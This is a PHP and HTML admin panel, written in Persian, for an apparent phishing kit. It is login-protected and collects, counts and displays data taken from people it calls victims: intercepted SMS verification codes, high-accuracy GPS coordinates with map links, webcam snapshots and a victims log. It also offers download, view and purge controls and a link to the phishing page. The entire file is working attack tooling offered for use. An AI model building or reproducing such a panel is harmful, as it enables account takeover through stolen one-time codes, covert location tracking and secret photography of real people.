<?php
session_start();

if (!isset($_SESSION['logged_in'])) {
    header('Location: login.php');
    exit;
}

$dir = __DIR__;

// دانلود فایل
if (isset($_GET['dl'])) {
    $file = basename($_GET['dl']);
    $path = $dir . '/' . $file;
    if (file_exists($path) && is_file($path)) {
        $mime = mime_content_type($path);
        header('Content-Description: File Transfer');
        header('Content-Type: ' . ($mime ?: 'application/octet-stream'));
        header('Content-Disposition: attachment; filename="' . $file . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }
}

// حذف فایل
if (isset($_GET['del'])) {
    $file = basename($_GET['del']);
    $path = $dir . '/' . $file;
    if (file_exists($path) && is_file($path)) {
        unlink($path);
        if (str_ends_with($file, '.jpg')) {
            $metaFile = str_replace('.jpg', '.meta.json', $file);
            $metaPath = $dir . '/' . $metaFile;
            if (file_exists($metaPath)) unlink($metaPath);
        }
    }
    header('Location: list.php');
    exit;
}

// پاک کردن همه
if (isset($_GET['purge'])) {
    array_map('unlink', glob($dir . '/*.json'));
    array_map('unlink', glob($dir . '/*.jpg'));
    array_map('unlink', glob($dir . '/*.log'));
    header('Location: list.php');
    exit;
}

// جمع‌آوری فایل‌ها
$files = [];
foreach (array_merge(glob($dir . '/*.json'), glob($dir . '/*.jpg')) as $f) {
    $files[] = [
        'name' => basename($f),
        'size' => filesize($f),
        'time' => filemtime($f),
        'path' => $f,
        'ext' => strtolower(pathinfo($f, PATHINFO_EXTENSION))
    ];
}
$logFile = $dir . '/victims.log';
$logExists = file_exists($logFile);

usort($files, fn($a, $b) => $b['time'] - $a['time']);

// آمار پایه
$totalFiles = count($files);
$totalSize = array_sum(array_column($files, 'size'));
$autoCount = count(glob($dir . '/auto_*.json'));
$clickCount = count(glob($dir . '/click_*.json'));
$fullCount = count(glob($dir . '/full_*.json'));
$webcamCount = count(glob($dir . '/webcam_*.jpg'));

// ========== آمار پیشرفته: شمارش پیامک‌ها و موقعیت‌های مکانی ==========
$totalSmsCaptured = 0;
$totalGpsCaptured = 0;
$smsDetails = [];
$gpsDetails = [];

// اسکن تمام فایل‌های click_*.json برای استخراج پیامک و GPS
foreach (glob($dir . '/click_*.json') as $clickFile) {
    $content = json_decode(file_get_contents($clickFile), true);
    if (!$content) continue;
    
    // شمارش پیامک‌ها
    if (isset($content['sms']) && is_array($content['sms'])) {
        $totalSmsCaptured += count($content['sms']);
        foreach ($content['sms'] as $sms) {
            $smsDetails[] = $sms;
        }
    }
    
    // شمارش GPS
    if (isset($content['gps']) && isset($content['gps']['latitude'])) {
        $totalGpsCaptured++;
        $gpsDetails[] = $content['gps'];
    }
}

// همچنین فایل‌های full_scan رو هم چک کن
foreach (glob($dir . '/full_*.json') as $fullFile) {
    $content = json_decode(file_get_contents($fullFile), true);
    if (!$content) continue;
    
    $clickPart = $content['click'] ?? $content['data']['click'] ?? null;
    if ($clickPart) {
        if (isset($clickPart['sms']) && is_array($clickPart['sms'])) {
            $totalSmsCaptured += count($clickPart['sms']);
            foreach ($clickPart['sms'] as $sms) {
                $smsDetails[] = $sms;
            }
        }
        if (isset($clickPart['gps']) && isset($clickPart['gps']['latitude'])) {
            $totalGpsCaptured++;
            $gpsDetails[] = $clickPart['gps'];
        }
    }
}

// همچنین auto_scan رو چک کن برای GPS
foreach (glob($dir . '/auto_*.json') as $autoFile) {
    $content = json_decode(file_get_contents($autoFile), true);
    if (!$content) continue;
    
    if (isset($content['latitude']) && isset($content['longitude']) && $content['latitude'] !== 'N/A') {
        $totalGpsCaptured++;
        $gpsDetails[] = [
            'latitude' => $content['latitude'],
            'longitude' => $content['longitude'],
            'accuracy' => $content['accuracy'] ?? 'N/A',
            'type' => 'auto_scan'
        ];
    }
}

// حذف موارد تکراری GPS
$seenGps = [];
$uniqueGps = [];
foreach ($gpsDetails as $gps) {
    $key = $gps['latitude'] . ',' . $gps['longitude'];
    if (!in_array($key, $seenGps)) {
        $seenGps[] = $key;
        $uniqueGps[] = $gps;
    }
}
$totalGpsCaptured = count($uniqueGps);

// نمایش محتوا
$viewContent = null;
$viewFile = null;
$viewIsImage = false;

if (isset($_GET['view'])) {
    $vf = basename($_GET['view']);
    $vp = $dir . '/' . $vf;
    if (file_exists($vp) && is_file($vp)) {
        $ext = strtolower(pathinfo($vf, PATHINFO_EXTENSION));
        if ($ext === 'json') {
            $content = file_get_contents($vp);
            $viewContent = json_decode($content, true);
            $viewFile = $vf;
            $viewIsImage = false;
        } elseif (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])) {
            $viewContent = null;
            $viewFile = $vf;
            $viewIsImage = true;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>داشبورد فیشینگ - اطلاعات جمع‌آوری شده</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif}
body{background:#0a0a1a;color:#fff;padding:20px;min-height:100vh}
.container{max-width:1200px;margin:0 auto}
header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
h1{font-size:24px;color:#00f260;font-weight:700}
h1 small{color:rgba(255,255,255,0.3);font-size:14px;font-weight:400}
.sub{color:rgba(255,255,255,0.4);font-size:13px;margin-top:2px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:24px}
.stat{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:16px 18px}
.stat-num{font-size:28px;font-weight:700;color:#00f260}
.stat-label{font-size:11px;color:rgba(255,255,255,0.35);margin-top:2px}
.stat-file{font-size:10px;color:rgba(255,255,255,0.2);margin-top:4px}

/* استایل جدید برای آمار پیامک و GPS */
.stat-sms{border-color:rgba(0,150,255,0.3)}
.stat-sms .stat-num{color:#0096ff}
.stat-gps{border-color:rgba(255,200,0,0.3)}
.stat-gps .stat-num{color:#ffc800}

.actions{margin-bottom:20px;display:flex;gap:8px;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border-radius:8px;font-size:12px;font-weight:600;text-decoration:none;border:none;cursor:pointer;transition:all .2s}
.btn-primary{background:linear-gradient(135deg,#00f260,#0575e6);color:#fff}
.btn-danger{background:rgba(255,50,50,0.15);border:1px solid rgba(255,50,50,0.2);color:#ff4444}
.btn-ghost{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:rgba(255,255,255,0.6)}
.btn-sm{padding:4px 10px;font-size:11px}
.btn:hover{transform:translateY(-1px);opacity:.9}
table{width:100%;border-collapse:collapse;background:rgba(255,255,255,0.02);border-radius:12px;overflow:hidden;margin-bottom:20px}
th{background:rgba(255,255,255,0.04);padding:10px 14px;font-size:11px;text-align:right;color:rgba(255,255,255,0.4);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
td{padding:10px 14px;font-size:12px;border-top:1px solid rgba(255,255,255,0.03);color:rgba(255,255,255,0.7)}
td .tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600}
.tag-auto{background:rgba(0,242,96,0.12);color:#00f260}
.tag-click{background:rgba(0,150,255,0.12);color:#0096ff}
.tag-full{background:rgba(255,200,0,0.12);color:#ffc800}
.tag-victim{background:rgba(255,100,200,0.12);color:#ff64c8}
.tag-webcam{background:rgba(255,50,50,0.15);color:#ff4444}
.tag-meta{background:rgba(255,255,255,0.06);color:rgba(255,255,255,0.4)}
td a{color:#00f260;text-decoration:none;font-weight:500}
td a:hover{text-decoration:underline}
td .action-group{display:flex;gap:4px;flex-wrap:wrap}
td .action-group a{padding:3px 8px;border-radius:4px;font-size:10px}
.dl-link{background:rgba(0,242,96,0.1);color:#00f260}
.view-link{background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.6)}
.del-link{background:rgba(255,50,50,0.1);color:#ff4444}
.empty-state{text-align:center;padding:60px 20px}
.empty-state .icon{font-size:60px;margin-bottom:16px;opacity:.3}
.empty-state p{color:rgba(255,255,255,0.3);font-size:14px}
.empty-state .subtext{font-size:11px;color:rgba(255,255,255,0.15);margin-top:4px}

/* Modal */
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;align-items:center;justify-content:center;padding:20px}
.modal.active{display:flex}
.modal-content{background:#111;border:1px solid rgba(255,255,255,0.08);border-radius:16px;width:100%;max-width:900px;max-height:90vh;overflow-y:auto;padding:24px;position:relative}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:8px}
.modal-header h2{font-size:16px;color:#00f260;word-break:break-all}
.modal-close{background:rgba(255,255,255,0.05);border:none;color:rgba(255,255,255,0.4);width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:18px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.modal-close:hover{background:rgba(255,255,255,0.1);color:#fff}
pre.json-view{background:rgba(255,255,255,0.02);padding:16px;border-radius:8px;font-size:11px;line-height:1.7;overflow-x:auto;color:rgba(255,255,255,0.7);direction:ltr;text-align:left;white-space:pre-wrap;word-break:break-all;max-height:65vh;overflow-y:auto}
.webcam-view{text-align:center}
.webcam-view img{max-width:100%;max-height:70vh;border-radius:8px;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
.webcam-view .meta{margin-top:12px;color:rgba(255,255,255,0.4);font-size:12px}
.log-view{background:rgba(255,255,255,0.02);padding:16px;border-radius:8px;font-size:11px;line-height:1.6;color:rgba(255,255,255,0.5);white-space:pre-wrap;direction:ltr;text-align:left;max-height:400px;overflow-y:auto}

/* استایل برای SMS و GPS Details */
.detail-section{margin-bottom:20px}
.detail-section h3{font-size:14px;color:#0096ff;margin-bottom:10px}
.detail-section h3.gps-title{color:#ffc800}
.detail-card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 14px;margin-bottom:6px;font-size:11px;line-height:1.6}
.detail-card .label{color:rgba(255,255,255,0.35);font-size:9px;text-transform:uppercase}
.detail-card .value{color:rgba(255,255,255,0.7)}
.detail-card.sms{border-color:rgba(0,150,255,0.15)}
.detail-card.gps{border-color:rgba(255,200,0,0.15)}
</style>
</head>
<body>
<div class="container">
    <header>
        <div>
            <h1>🛡 Dashboard <small>Phishing Data</small></h1>
            <p class="sub">داده‌های جمع‌آوری شده از قربانیان</p>
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap">
            <a href="?log=1" class="btn btn-ghost">📋 لاگ</a>
            <a href="?purge=1" class="btn btn-danger" onclick="return confirm('همه فایل‌ها پاک شوند؟')">🗑 پاک کردن همه</a>
            <a href="index.html" class="btn btn-primary" target="_blank">🎯 صفحه فیشینگ</a>
        </div>
    </header>

    <!-- آمار -->
    <div class="stats">
        <div class="stat">
            <div class="stat-num"><?= $totalFiles ?></div>
            <div class="stat-label">کل فایل‌ها</div>
            <div class="stat-file"><?= $totalSize > 1024 ? round($totalSize/1024, 1) . ' KB' : $totalSize . ' B' ?></div>
        </div>
        <div class="stat">
            <div class="stat-num"><?= $autoCount ?></div>
            <div class="stat-label">اسکن خودکار</div>
            <div class="stat-file">JSON</div>
        </div>
        <div class="stat">
            <div class="stat-num"><?= $clickCount ?></div>
            <div class="stat-label">کلیک شده</div>
            <div class="stat-file">JSON</div>
        </div>
        <div class="stat">
            <div class="stat-num"><?= $fullCount ?></div>
            <div class="stat-label">کامل</div>
            <div class="stat-file">JSON</div>
        </div>
        <div class="stat" style="border-color:rgba(255,50,50,0.2)">
            <div class="stat-num" style="color:#ff4444"><?= $webcamCount ?></div>
            <div class="stat-label">📷 عکس دوربین</div>
            <div class="stat-file">JPG</div>
        </div>
        <div class="stat">
            <div class="stat-num"><?= $logExists ? number_format(count(file($logFile))) : '0' ?></div>
            <div class="stat-label">خطوط لاگ</div>
            <div class="stat-file">IP, GPS, SMS</div>
        </div>

        <!-- آمار جدید: پیامک -->
        <div class="stat stat-sms">
            <div class="stat-num"><?= $totalSmsCaptured ?></div>
            <div class="stat-label">💬 پیامک‌های گرفته شده</div>
            <div class="stat-file">WebOTP + Notification</div>
        </div>

        <!-- آمار جدید: موقعیت مکانی -->
        <div class="stat stat-gps">
            <div class="stat-num"><?= $totalGpsCaptured ?></div>
            <div class="stat-label">📍 موقعیت‌های مکانی</div>
            <div class="stat-file">GPS High Accuracy</div>
        </div>
    </div>

    <!-- جزئیات پیامک‌ها -->
    <?php if ($totalSmsCaptured > 0): ?>
    <div class="detail-section">
        <h3>💬 پیامک‌های ضبط شده (<?= $totalSmsCaptured ?>)</h3>
        <?php foreach ($smsDetails as $i => $sms): ?>
        <div class="detail-card sms">
            <div class="label">پیامک #<?= $i+1 ?> | <?= $sms['type'] ?? 'unknown' ?></div>
            <div class="value">
                <?php if (isset($sms['code'])): ?>
                    <strong>کد تأیید:</strong> <?= htmlspecialchars($sms['code']) ?><br>
                    <strong>مبدا:</strong> <?= htmlspecialchars($sms['origin'] ?? 'N/A') ?>
                <?php elseif (isset($sms['note'])): ?>
                    <?= htmlspecialchars($sms['note']) ?>
                <?php elseif (isset($sms['content'])): ?>
                    <strong>محتوا:</strong> <?= htmlspecialchars(substr($sms['content'], 0, 200)) ?>
                <?php else: ?>
                    <?= htmlspecialchars(json_encode($sms, JSON_UNESCAPED_UNICODE)) ?>
                <?php endif; ?>
                <br><span style="color:rgba(255,255,255,0.2);font-size:10px"><?= $sms['timestamp'] ?? date('Y-m-d H:i:s') ?></span>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <!-- جزئیات موقعیت‌های مکانی -->
    <?php if ($totalGpsCaptured > 0): ?>
    <div class="detail-section">
        <h3 class="gps-title">📍 موقعیت‌های مکانی ضبط شده (<?= $totalGpsCaptured ?>)</h3>
        <?php foreach ($uniqueGps as $i => $gps): ?>
        <div class="detail-card gps">
            <div class="label">موقعیت #<?= $i+1 ?> | دقت: <?= $gps['accuracy'] ?? 'N/A' ?></div>
            <div class="value">
                <strong>مختصات:</strong> <a href="https://www.google.com/maps?q=<?= $gps['latitude'] ?>,<?= $gps['longitude'] ?>" target="_blank" style="color:#00f260"><?= $gps['latitude'] ?>, <?= $gps['longitude'] ?></a><br>
                <strong>سرعت:</strong> <?= $gps['speed'] ?? 'N/A' ?> | 
                <strong>ارتفاع:</strong> <?= $gps['altitude'] ?? 'N/A' ?> |
                <strong>جهت:</strong> <?= $gps['heading'] ?? 'N/A' ?>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <?php if (isset($_GET['log']) && $logExists): ?>
    <div style="margin-bottom:20px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <h2 style="font-size:15px;color:#00f260">📋 victims.log</h2>
            <a href="?dl=victims.log" class="btn btn-sm btn-primary">📥 دانلود</a>
        </div>
        <div class="log-view"><?= htmlspecialchars(file_get_contents($logFile)) ?></div>
    </div>
    <?php endif; ?>

    <?php if ($totalFiles > 0): ?>
    <div style="overflow-x:auto">
    <table>
        <thead>
            <tr>
                <th>نام فایل</th>
                <th>نوع</th>
                <th>سایز</th>
                <th>تاریخ</th>
                <th>عملیات</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($files as $f): 
                $fname = $f['name'];
                $ext = $f['ext'];
                $fsize = $f['size'] > 1024 ? round($f['size']/1024, 1) . ' KB' : $f['size'] . ' B';
                $ftime = date('Y-m-d H:i:s', $f['time']);
                
                $tag = 'tag-full';
                $tagText = 'JSON';
                if (str_starts_with($fname, 'auto_')) { $tag = 'tag-auto'; $tagText = 'خودکار'; }
                elseif (str_starts_with($fname, 'click_')) { $tag = 'tag-click'; $tagText = 'کلیک'; }
                elseif (str_starts_with($fname, 'full_') || str_starts_with($fname, 'victim_')) { $tag = 'tag-full'; $tagText = 'کامل'; }
                elseif (str_starts_with($fname, 'webcam_') && $ext === 'jpg') { $tag = 'tag-webcam'; $tagText = '📷 عکس'; }
                elseif (str_starts_with($fname, 'webcam_') && $ext === 'json') { $tag = 'tag-meta'; $tagText = 'متا'; }
            ?>
            <tr>
                <td style="word-break:break-all"><?= htmlspecialchars($fname) ?></td>
                <td><span class="tag <?= $tag ?>"><?= $tagText ?></span></td>
                <td><?= $fsize ?></td>
                <td style="direction:ltr;text-align:right;font-size:11px"><?= $ftime ?></td>
                <td>
                    <div class="action-group">
                        <a href="?dl=<?= urlencode($fname) ?>" class="dl-link">📥</a>
                        <?php if ($ext === 'json' || $ext === 'jpg'): ?>
                        <a href="?view=<?= urlencode($fname) ?>" class="view-link">👁</a>
                        <?php endif; ?>
                        <a href="?del=<?= urlencode($fname) ?>" class="del-link" onclick="return confirm('حذف شود؟')">🗑</a>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    </div>
    <?php else: ?>
    <div class="empty-state">
        <div class="icon">📭</div>
        <p>هنوز هیچ داده‌ای جمع‌آوری نشده است</p>
        <p class="subtext">منتظر بمانید تا قربانیان وارد صفحه شوند</p>
        <a href="index.html" class="btn btn-primary" style="margin-top:16px" target="_blank">رفتن به صفحه فیشینگ</a>
    </div>
    <?php endif; ?>

    <!-- نمایش فایل -->
    <?php if ($viewFile !== null): ?>
    <div class="modal active" id="fileModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📄 <?= htmlspecialchars($viewFile) ?></h2>
                <button class="modal-close" onclick="document.getElementById('fileModal').classList.remove('active')">✕</button>
            </div>
            
            <?php if ($viewIsImage): ?>
            <div class="webcam-view">
                <img src="<?= htmlspecialchars($viewFile) . '?t=' . time() ?>" alt="Webcam" style="max-width:100%">
                <div class="meta">
                    📸 عکس دوربین قربانی | 
                    <a href="?dl=<?= urlencode($viewFile) ?>" style="color:#00f260">دانلود</a>
                </div>
            </div>
            <?php elseif ($viewContent !== null): ?>
            <pre class="json-view"><?= htmlspecialchars(json_encode($viewContent, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) ?></pre>
            <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
                <a href="?dl=<?= urlencode($viewFile) ?>" class="btn btn-sm btn-primary">📥 دانلود</a>
                <button class="btn btn-sm btn-ghost" onclick="navigator.clipboard.writeText(JSON.stringify(<?= json_encode($viewContent) ?>, null, 2)).then(()=>{this.textContent='✅ کپی شد';setTimeout(()=>{this.textContent='📋 کپی'},2000)})">📋 کپی</button>
            </div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
</div>

<script>
document.getElementById('fileModal')?.addEventListener('click', function(e) {
    if (e.target === this) this.classList.remove('active');
});
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.getElementById('fileModal')?.classList.remove('active');
    }
});
</script>
</body>
</html>